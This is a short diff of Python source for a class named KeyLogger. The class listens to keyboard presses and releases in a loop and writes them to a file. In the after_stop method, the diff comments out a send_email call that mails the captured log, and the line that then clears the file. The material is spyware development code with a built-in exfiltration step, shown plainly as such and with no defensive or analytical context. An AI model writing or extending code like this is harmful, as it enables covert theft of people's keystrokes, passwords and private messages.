@@ -21,7 +21,6 @@ class KeyLogger:
 
     def run(self):
         while self.number_of_iterations < number_of_iterations_end:
-
             with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                 listener.join()
 
@@ -52,10 +51,10 @@ class KeyLogger:
             return False
 
     def after_stop(self):
-        send_email(self.filename, self.file_path)
-        
-        with open(self.file_path, "w") as f:
-            f.write(" ")
+        # send_email(self.filename, self.file_path)
+
+        # with open(self.file_path, "w") as f:
+        # f.write(" ")
         self.number_of_iterations += 1
 
         self.currentTime = time.time()
